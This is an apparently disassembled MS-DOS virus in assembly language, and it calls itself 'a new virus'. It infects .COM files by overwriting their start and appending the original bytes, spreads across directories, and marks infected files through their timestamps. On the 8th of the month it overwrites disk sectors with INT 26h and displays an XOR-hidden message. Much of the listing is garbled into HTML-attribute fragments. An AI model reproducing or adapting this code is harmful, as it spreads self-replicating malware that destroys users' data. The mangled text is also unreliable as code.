﻿

	PAGE	,132
S00000	SEGMENT BYTE PUBLIC 'code'
	ASSUME	CS:S00000
	ASSUME	SS:S00000
	ASSUME	DS:S00000
H00000	DB	256 DUP(?)
P00100	PROC	FAR
	ASSUME	ES:S00000
H00100:
	JMP	SHORT H00149
	DB	0B0H
	DB	'g<g' db="" 0cfh="" db="" '*.com'="" dw="" 2a00h="" dw="" 5c00h="" dw="" 2e00h="" dw="" 002eh="" h00114="" db="" 01h,5ch="" db="" 40="" dup(?)="" h0013e="" db="" 0="" h0013f="" db="" 00h,0e7h="" dw="" 0002h="" h00143="" db="" 1="" h00144="" dw="" 0e82eh="" h00146="" dw="" 0f000h="" h00148="" db="" 0="" h00149:="" jmp="" short="" h0018d="" dw="" 0d8edh="" dw="" 0cfcfh="" dw="" 0c3deh="" dw="" 0cdc4h="" dw="" 8ad9h="" dw="" 0d8cch="" dw="" 0c7c5h="" dw="" 0e48ah="" dw="" 0decbh="" dw="" 0c5c3h="" dw="" 0cbc4h="" dw="" 8ac6h="" dw="" 0cfe9h="" dw="" 0dec4h="" dw="" 0cbd8h="" dw="" 8ac6h="" dw="" 0c4ffh="" dw="" 0dcc3h="" dw="" 0d8cfh="" dw="" 0c3d9h="" dw="" 0d3deh="" dw="" 8b8ah="" dw="" 0d0ah="" dw="" 0e324h="" dw="" 8ad9h="" dw="" 0c5deh="" dw="" 0cbceh="" dw="" 8ad3h="" dw="" 0dfd9h="" dw="" 0c4c4h="" dw="" 8ad3h="" dw="" 0a95h="" dw="" 240dh="" h0018d:="" cli="" push="" es="" mov="" ax,0000h="" assume="" es:nothing="" mov="" es,ax="" mov="" ax,word="" ptr="" es:[0058h]="" mov="" h00144,ax="" mov="" ax,word="" ptr="" es:[005ah]="" mov="" h00146,ax="" mov="" word="" ptr="" es:[0058h],0102h="" mov="" es:[005ah],cs="" pop="" es="" in="" al,21h="" or="" al,02h="" out="" 21h,al="" sti="" mov="" cx,0080h="" mov="" si,0000h="" mov="" bx,0080h="" h001bf:="" mov="" ax,[bx+si]="" push="" ax="" inc="" si="" inc="" si="" loop="" h001bf="" mov="" byte="" ptr="" h00114,00h="" mov="" byte="" ptr="" h0013e,00h="" mov="" byte="" ptr="" h0013f,00h="" mov="" byte="" ptr="" h00148,00h="" mov="" ah,19h="" int="" 21h="" mov="" h00114,al="" mov="" h00143,al="" mov="" ah,47h="" mov="" dl,00h="" mov="" si,0116h="" int="" 21h="" push="" ds="" mov="" ax,0000h="" assume="" ds:nothing="" mov="" ds,ax="" mov="" al,byte="" ptr="" ds:[0475h]="" pop="" ds="" mov="" ds:[0142h],al="" cmp="" al,00h="" je="" h00208="" mov="" ah,0eh="" mov="" dl,02h="" mov="" ds:[0143h],dl="" int="" 21h="" h00208:="" mov="" ah,3bh="" mov="" dx,010fh="" int="" 21h="" h0020f:="" mov="" ah,4eh="" mov="" cx,0003h="" mov="" dx,0107h="" int="" 21h="" jnc="" h0021e="" jmp="" h002b9="" h0021e:="" mov="" ax,word="" ptr="" ds:[0096h]="" and="" ax,001fh="" cmp="" al,1fh="" jne="" h0022b="" jmp="" h002b0="" h0022b:="" mov="" ax,word="" ptr="" ds:[009ah]="" mov="" ds:[0140h],ax="" mov="" ah,43h="" mov="" al,01h="" mov="" cl,ds:[0095h]="" and="" cx,00feh="" mov="" dx,009eh="" int="" 21h="" mov="" ah,3dh="" mov="" al,02h="" mov="" dx,009eh="" int="" 21h="" mov="" bx,ax="" mov="" ah,3fh="" mov="" cx,02e7h="" mov="" dx,0f800h="" int="" 21h="" mov="" ah,42h="" mov="" al,00h="" mov="" cx,0000h="" mov="" dx,0000h="" int="" 21h="" mov="" ah,40h="" mov="" cx,02e7h="" mov="" dx,0100h="" int="" 21h="" mov="" ah,42h="" mov="" al,02h="" mov="" cx,0000h="" mov="" dx,0000h="" int="" 21h="" mov="" ah,40h="" mov="" cx,02e7h="" mov="" dx,0f800h="" int="" 21h="" mov="" ah,57h="" mov="" al,01h="" mov="" cx,ds:[0096h]="" mov="" dx,ds:[0098h]="" or="" cl,1fh="" int="" 21h="" mov="" ah,43h="" mov="" al,01h="" mov="" cl,ds:[0095h]="" mov="" dx,009eh="" int="" 21h="" mov="" ah,3eh="" int="" 21h="" inc="" byte="" ptr="" ds:[013eh]="" cmp="" byte="" ptr="" ds:[013eh],03h="" je="" h0031e="" h002b0:="" mov="" ah,4fh="" int="" 21h="" jc="" h002b9="" jmp="" h0021e="" h002b9:="" mov="" ah,4eh="" mov="" dx,010dh="" mov="" cx,0012h="" int="" 21h="" jc="" h002f4="" h002c5:="" cmp="" byte="" ptr="" ds:[009eh],2eh="" jne="" h002d4="" h002cc:="" mov="" ah,4fh="" int="" 21h="" jnc="" h002c5="" jmp="" short="" h002f4="" h002d4:="" mov="" ah,3bh="" mov="" dx,009eh="" int="" 21h="" jc="" h002cc="" mov="" cx,000bh="" mov="" si,0000h="" mov="" bx,0080h="" h002e6:="" mov="" ax,[bx+si]="" push="" ax="" inc="" si="" inc="" si="" loop="" h002e6="" inc="" byte="" ptr="" ds:[013fh]="" jmp="" h0020f="" h002f4:="" cmp="" byte="" ptr="" ds:[013fh],00h="" je="" h0031e="" dec="" byte="" ptr="" ds:[013fh]="" mov="" ah,3bh="" mov="" dx,0111h="" int="" 21h="" mov="" cx,000bh="" mov="" di,0014h="" mov="" bx,0080h="" h0030f:="" pop="" ax="" mov="" [bx+di],ax="" dec="" di="" dec="" di="" loop="" h0030f="" mov="" ah,4fh="" int="" 21h="" jc="" h002f4="" jmp="" h002c5="" h0031e:="" mov="" ah,2ah="" int="" 21h="" cmp="" dl,08h="" jne="" h00352="" mov="" byte="" ptr="" ds:[0148h],01h="" mov="" al,byte="" ptr="" ds:[0143h]="" mov="" cx,00a0h="" mov="" dx,0000h="" mov="" bx,0000h="" int="" 26h="" popf="" cmp="" byte="" ptr="" ds:[0142h],02h="" jne="" h00361="" mov="" al,03h="" mov="" cx,00a0h="" mov="" dx,0000h="" mov="" bx,0000h="" int="" 26h="" popf="" jmp="" short="" h00361="" h00352:="" mov="" ah,0eh="" mov="" dl,ds:[0114h]="" int="" 21h="" mov="" ah,3bh="" mov="" dx,0115h="" int="" 21h="" h00361:="" cli="" push="" es="" mov="" ax,0000h="" mov="" es,ax="" mov="" ax,word="" ptr="" ds:[0144h]="" mov="" es:[0058h],ax="" mov="" ax,word="" ptr="" ds:[0146h]="" mov="" es:[005ah],ax="" pop="" es="" in="" al,21h="" and="" al,0fdh="" out="" 21h,al="" sti="" cmp="" byte="" ptr="" ds:[0148h],01h="" jne="" h003b5="" mov="" cx,002ch="" mov="" di,0000h="" mov="" bx,014bh="" h0038e:="" xor="" byte="" ptr="" [bx+di],0aah="" inc="" di="" loop="" h0038e="" mov="" cx,0010h="" mov="" di,0000h="" mov="" bx,017ah="" h0039d:="" xor="" byte="" ptr="" [bx+di],0aah="" inc="" di="" loop="" h0039d="" mov="" ah,09h="" mov="" dx,014bh="" int="" 21h="" mov="" ah,09h="" mov="" dx,017ah="" int="" 21h="" mov="" ah,07h="" int="" 21h="" h003b5:="" mov="" cx,0080h="" mov="" di,00feh="" mov="" bx,0080h="" h003be:="" pop="" ax="" mov="" [bx+di],ax="" dec="" di="" dec="" di="" loop="" h003be="" mov="" cx,0008h="" mov="" si,03dfh="" mov="" di,0f800h="" cld="" repz="" movsb="" mov="" cx,02e7h="" mov="" si,ds:[0140h]="" add="" si,0100h="" jmp="" h0f800="" p00100="" endp="" dw="" 00bfh="" dw="" 0f301h="" dw="" 0e9a4h="" dw="" 08f8h="" dw="" 09bah="" dw="" 0b401h="" dw="" 0cd09h="" dw="" 0cd21h="" db="" '="" this="" is="" a="" new="" virus="" !$89'="" db="" '="" 6:01pm="" delayer="" com="" '="" db="" '="" 329="" 5/04/89="" 3:41am="" '="" db="" 'de_aids1="" com="" 389="" 6/26'="" db="" '/89="" 7:20am="" dosedit="" c'="" db="" 'om="" 1706="" 10/05/83="" 4:15p'="" db="" 'm="" dt="" exe="" 21084="" 11'="" db="" '/15/88="" 4:50pm="" fastkey'="" db="" '="" com="" 336="" 6/04/89="" 4:'="" db="" '02pm="" find1701="" exe="" 23584'="" db="" '="" 5/20/89="" 5:01pm="" flus'="" db="" 'hot="" dat="" 54="" 9/05/89="" '="" db="" '="" 5:59pm="" flu_poke="" com="" '="" db="" '844="" 5/01/89="" 12:00am="" f'="" db="" 'sp="" com="" 16885="" 9/05/'="" db="" '89="" 6:00pm="" killb5="" com="" '="" db="" '="" 10784="" 8/05/89="" 10:12pm="" '="" db="" '="" killb5="" shw="" 10784="" 8/'="" db="" '05/89="" 10:12pm="" long="" b'="" db="" 'at="" 549="" 9/24/89="" 6:02p'="" db="" 'm="" m-1704="" exe="" 23920="" '="" db="" '="" 5/30/89="" 11:14am="" memchk="" '="" db="" '="" com="" 1266="" 2/22/87="" 4:'="" db="" '31pm="" mirorsav="" fil="" '="" db="" '41="" 10/22/89="" 9:41am="" mirr'="" db="" 'or="" bak="" 12288="" 10/01/89="" '="" db="" '="" 3:31am="" mirror="" com="" '="" db="" '14733="" 1/05/89="" 4:02pm="" m'="" db="" 'irror="" fil="" 12288="" 10/22/'="" db="" '89="" 9:41am'="" s00000="" ends="" end="" p00100="" =""></g'>